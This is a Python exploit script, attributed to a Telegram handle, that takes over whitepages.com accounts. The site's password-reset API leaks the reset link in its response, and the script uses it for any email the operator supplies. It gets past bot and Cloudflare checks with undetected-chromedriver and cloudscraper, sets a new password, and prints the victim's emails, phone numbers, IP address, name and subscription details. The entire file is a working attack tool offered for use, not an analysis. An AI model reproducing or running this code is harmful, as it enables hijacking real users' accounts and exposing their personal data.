# Whitepages.com Vulnerability Exploit by https://t.me/Swezy
# 13. September 2025
# CVE-2025-XXXX 
# Exploit Author: Swezy
# GitHub: https://github.com/SwezyDev

from datetime import datetime, timezone
from secure_input import secure_input
import undetected_chromedriver as uc
from dateutil import parser
from colorama import Fore
import cloudscraper
import time
import json
import os

##### Get the CSRF Token for the Password Reset Request #####

GET_CSRF = """
const cb = arguments[arguments.length-1];
fetch('/api/getcsrftoken', { credentials: 'include' })
    .then(async res => {
        const headers = {};
        for (const pair of res.headers.entries()) headers[pair[0]] = pair[1];
        let body;
        try { body = await res.json(); } catch(e) { body = await res.text(); }
        cb({status: res.status, headers: headers, body: body});
    })
    .catch(err => cb({error: String(err)}));
"""

##### Post the Password Reset Request #####

POST_RESET = """
const csrf = arguments[0];
const emailToken = arguments[1];
const newPassword = arguments[2];
const cb = arguments[arguments.length-1];
fetch('/api/auth/reset-password-by-email', {
    method: 'POST', credentials: 'include',
    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
    body: JSON.stringify({ emailToken: emailToken, newPassword: newPassword })
})
.then(async res => { let text = await res.text(); cb({status: res.status, body: text}); })
.catch(err => cb({error: String(err)}));
"""

##### Helper function to format timestamps #####

def format_time(date):
    if not date or date.lower() == 'none':
        return f"{Fore.LIGHTBLACK_EX}N/A"
    try:
        dt = parser.isoparse(date)
        now = datetime.now(timezone.utc)
        diff = now - dt.astimezone(timezone.utc)

        days = diff.days
        seconds = diff.seconds
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60

        if days > 0:
            ago = f"{days} day{'s' if days > 1 else ''} ago"
        elif hours > 0:
            ago = f"{hours} hour{'s' if hours > 1 else ''} ago"
        elif minutes > 0:
            ago = f"{minutes} minute{'s' if minutes > 1 else ''} ago"
        else:
            ago = "just now"

        formatted = dt.strftime("%m-%d-%YT%H-%M-%S")
        return f"{Fore.LIGHTBLACK_EX}{formatted} ({Fore.WHITE}{ago}{Fore.LIGHTBLACK_EX})"
    except Exception:
        return date

##### Function to reset password using undetected-chromedriver #####

def reset_password(password, reset_url):
    options = uc.ChromeOptions()
    options.add_argument('--headless=new')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')

    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36")

    driver = uc.Chrome(options=options)
    try:
        driver.get(reset_url)
        time.sleep(1.2)

        deadline = time.time() + 30
        fetch_result = None
        while time.time() < deadline:
            fetch_result = driver.execute_async_script(GET_CSRF) # Get CSRF token
            if fetch_result and fetch_result.get('status') == 200:
                break
            time.sleep(0.8)

        if not fetch_result or fetch_result.get('status') != 200:
            return {"error": "getcsrftoken failed"}, 403

        body = fetch_result.get('body')
        csrf = None
        if isinstance(body, dict):
            csrf = body.get('csrfToken') or body.get('token')
        else:
            try:
                p = json.loads(body)
                csrf = p.get('csrfToken') or p.get('token')
            except Exception:
                csrf = str(body).strip()[:200]

        if not csrf:
            return {"error": "csrf not found"}, 403

        res = driver.execute_async_script(POST_RESET, csrf, reset_url.split("/")[-1], password) # Post the reset request
        if res is None:
            return {"error": "reset request returned nothing"}, 403
        if 'error' in res:
            return {"error": res['error']}, 403

        status = res.get('status') 
        body = res.get('body', '') 

        try:
            parsed = json.loads(body)
        except Exception:
            parsed = {"raw": body}

        return parsed, int(status) # Return the parsed JSON and status code

    finally:
        try:
            driver.quit()
        except Exception:
            pass

##### Main function to execute the exploit and reset password #####

def main():
    os.system("cls" if os.name == "nt" else "clear")
    os.system("title Whitepages.com Vulnerability ^| Telegram ^@Swezy" if os.name == "nt" else "")
    print(" Whitepages.com Vulnerability | Telegram @Swezy\n")

    email = input(f"{Fore.WHITE} [{Fore.LIGHTBLACK_EX}?{Fore.WHITE}] Enter E-Mail ➔{Fore.LIGHTBLACK_EX}  ")
    new_password = secure_input(f"{Fore.WHITE} [{Fore.LIGHTBLACK_EX}?{Fore.WHITE}] Enter new Password ➔{Fore.LIGHTBLACK_EX}  ", show="*")
    start = time.time()
    print(f"\n{Fore.WHITE} [{Fore.LIGHTBLACK_EX}*{Fore.WHITE}] Preparing Exploit Payload...\n")
    

    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'windows','mobile': False}) # cloudscraper to bypass Cloudflare
    # firefox UA: 

    print(f"{Fore.WHITE} [{Fore.LIGHTBLACK_EX}*{Fore.WHITE}] Sending Exploit Payload...")

    # Trigger the password reset email || Vulnerable Endpoint

    res = scraper.post(
        "https://www.whitepages.com/api/auth/trigger-reset-password-email",
        json={"email": email},
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.whitepages.com",
            "Referer": "https://www.whitepages.com/auth/forgot-password"
        },
        timeout=15
    )

    if res.status_code != 202:
        print(f"{Fore.WHITE} [{Fore.RED}✘{Fore.WHITE}] Failed to send Exploit [{Fore.LIGHTBLACK_EX}{res.status_code}{Fore.WHITE}]")
        return

    print(f"{Fore.WHITE} [{Fore.LIGHTBLACK_EX}+{Fore.WHITE}] Exploit Sent Successfully [{Fore.LIGHTBLACK_EX}{res.status_code}{Fore.WHITE}]")

    # Read the response to get the reset URL

    try:
        data = res.json()
    except json.JSONDecodeError:
        data = {}

    attrs = data.get('amplitudeAttributes', {})
    reset_url = attrs.get('password_url')
    if not reset_url:
        print(f"\n{Fore.WHITE} [{Fore.RED}✘{Fore.WHITE}] No Password Reset URL found")
        return

    print(f"\n{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Reset Password URL: {Fore.LIGHTBLACK_EX}{reset_url}{Fore.WHITE}")

    print(f"\n{Fore.WHITE} [{Fore.LIGHTBLACK_EX}*{Fore.WHITE}] Preparing Password Reset Exploit...\n")


    print(f"{Fore.WHITE} [{Fore.LIGHTBLACK_EX}*{Fore.WHITE}] Sending Password Reset Exploit...")


    reset_json, reset_status = reset_password(new_password, reset_url) # Call the reset_password function
    
    if reset_status != 200:
        print(f"\n{Fore.WHITE} [{Fore.RED}✘{Fore.WHITE}] Failed to Reset Password [{Fore.LIGHTBLACK_EX}{reset_status}{Fore.WHITE}]")
        return
    
    # Displaying all the account details after successful password reset (reading the JSON response)
    
    legacy_modal = reset_json.get('legacyModal', 'N/A')
    if legacy_modal == "false":
        legacy_output = False
    elif legacy_modal == "true":
        legacy_output = True
    else:
        legacy_output = legacy_modal

    print(f"\n{Fore.WHITE} [{Fore.LIGHTBLACK_EX}*{Fore.WHITE}] Account Details Found\n")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Primary Email: {Fore.LIGHTBLACK_EX}{reset_json.get('primaryEmail', 'N/A')}{Fore.WHITE}")
    emails_list = reset_json.get("emails", [])
    if emails_list:
        print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Associated Emails:")
        for i, e in enumerate(emails_list):
            email_list_x = e.get("email", "N/A")
            id_list_x = e.get("id", "N/A")
            user_id_list_x = e.get("user_id", "N/A")
            created_at_list_x = e.get("created_at", "N/A")
            created_at_list_xx = format_time(created_at_list_x) 
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Email: {Fore.LIGHTBLACK_EX}{email_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] ID: {Fore.LIGHTBLACK_EX}{id_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] User ID: {Fore.LIGHTBLACK_EX}{user_id_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Created At: {created_at_list_xx}{Fore.WHITE}")
            if i < len(emails_list) - 1:
                print(f" {Fore.LIGHTBLACK_EX}----------------------------------------------------------------{Fore.WHITE}")
    else:
        print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Associated Emails: {Fore.LIGHTBLACK_EX}N/A{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Password: {Fore.LIGHTBLACK_EX}{new_password}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Name: {Fore.LIGHTBLACK_EX}{reset_json.get('name', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Full Name: {Fore.LIGHTBLACK_EX}{reset_json.get('firstName', 'N/A')} {reset_json.get('middleName', 'N/A')} {reset_json.get('lastName', 'N/A')}{Fore.WHITE}")
    phone_list = reset_json.get("phoneNumbers", [])
    if phone_list:
        print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Associated Phone Numbers:")
        for i, e in enumerate(phone_list):
            phone_list_x = e.get("number", "N/A")
            id_list_x = e.get("id", "N/A")
            user_id_list_x = e.get("user_id", "N/A")
            created_at_list_x = e.get("created_at", f"{Fore.LIGHTBLACK_EX}N/A") 
            created_at_list_xx = format_time(created_at_list_x)
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Phone Number: {Fore.LIGHTBLACK_EX}{phone_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] ID: {Fore.LIGHTBLACK_EX}{id_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] User ID: {Fore.LIGHTBLACK_EX}{user_id_list_x}{Fore.WHITE}")
            print(f"    {Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Created At: {created_at_list_xx}{Fore.WHITE}")
            if i < len(phone_list) - 1:
                print(f" {Fore.LIGHTBLACK_EX}----------------------------------------------------------------{Fore.WHITE}")
    else:
        print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Associated Phone Numbers: {Fore.LIGHTBLACK_EX}N/A{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Account ID: {Fore.LIGHTBLACK_EX}{reset_json.get('id', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] IP Address: {Fore.LIGHTBLACK_EX}{reset_json.get('ipAddress', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] User Type: {Fore.LIGHTBLACK_EX}{reset_json.get('userType', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Login Allowed: {Fore.LIGHTBLACK_EX}{reset_json.get('loginAllowed', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Membership Type: {Fore.LIGHTBLACK_EX}{reset_json.get('membershipType', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Business Features Status: {Fore.LIGHTBLACK_EX}{reset_json.get('businessFeaturesStatus', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Has Business Features: {Fore.LIGHTBLACK_EX}{reset_json.get('hasBusinessFeatures', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Has Full Property Features: {Fore.LIGHTBLACK_EX}{reset_json.get('hasFullPropertyFeatures', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Premium Subscriber: {Fore.LIGHTBLACK_EX}{reset_json.get('premiumSubscriber', 'N/A')}{Fore.WHITE}")
    created_at_ac = reset_json.get('createdAt', f"{Fore.LIGHTBLACK_EX}N/A")
    created_at_ac_x = format_time(created_at_ac)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Account Created at: {created_at_ac_x}{Fore.WHITE}")
    password_changed_at = reset_json.get('pwdChangedAt', f"{Fore.LIGHTBLACK_EX}N/A")
    password_changed_at_x = format_time(password_changed_at)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Password Changed at: {password_changed_at_x}{Fore.WHITE}")
    subscription_ended_at = reset_json.get('subscriptionEndedAt', f"{Fore.LIGHTBLACK_EX}N/A")
    subscription_ended_at_x = format_time(subscription_ended_at)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Subscription Ended at: {subscription_ended_at_x}{Fore.WHITE}")
    payment_edited_at = reset_json.get('paymentEditedAt', f"{Fore.LIGHTBLACK_EX}N/A")
    payment_edited_at_x = format_time(payment_edited_at)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Payment Edited at: {payment_edited_at_x}{Fore.WHITE}")
    premium_tos_accepted_at = reset_json.get('premiumTosAcceptedAt', f"{Fore.LIGHTBLACK_EX}N/A")
    premium_tos_accepted_at_x = format_time(premium_tos_accepted_at)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Premium ToS Accepted at: {premium_tos_accepted_at_x}{Fore.WHITE}")
    landlord_tos_accepted_at = reset_json.get('landlordTosAcceptedAt', f"{Fore.LIGHTBLACK_EX}N/A")
    landlord_tos_accepted_at_x = format_time(landlord_tos_accepted_at)
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Landlord ToS Accepted at: {landlord_tos_accepted_at_x}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Suspended: {Fore.LIGHTBLACK_EX}{reset_json.get('suspended', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Disabled: {Fore.LIGHTBLACK_EX}{reset_json.get('disabled', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Mobile: {Fore.LIGHTBLACK_EX}{reset_json.get('mobile', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Industry: {Fore.LIGHTBLACK_EX}{reset_json.get('industry', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Legacy Modal: {Fore.LIGHTBLACK_EX}{legacy_output}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] Auto Monitor Disabled: {Fore.LIGHTBLACK_EX}{reset_json.get('autoMonitorDisabled', 'N/A')}{Fore.WHITE}")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] PNP Beta Opt in: {Fore.LIGHTBLACK_EX}{reset_json.get('pnpBetaOptIn', 'N/A')}{Fore.WHITE}")

    print(f"\n{Fore.WHITE} [{Fore.LIGHTBLACK_EX}+{Fore.WHITE}] Password Reset Successfully [{Fore.LIGHTBLACK_EX}{reset_status}{Fore.WHITE}]")
    print(f"{Fore.WHITE} [{Fore.GREEN}✓{Fore.WHITE}] New Password: {Fore.LIGHTBLACK_EX}{new_password}{Fore.WHITE}\n")
    end = time.time()
    print(f"{Fore.WHITE} [{Fore.YELLOW}${Fore.WHITE}] Total Time Taken: {Fore.YELLOW}{end - start:.2f}s{Fore.WHITE}")
    os.system("pause >nul" if os.name == "nt" else "read -n 1 -s -r")
    os._exit(0)
    # Thats all :o

if __name__ == "__main__":
    main() # Run the main function
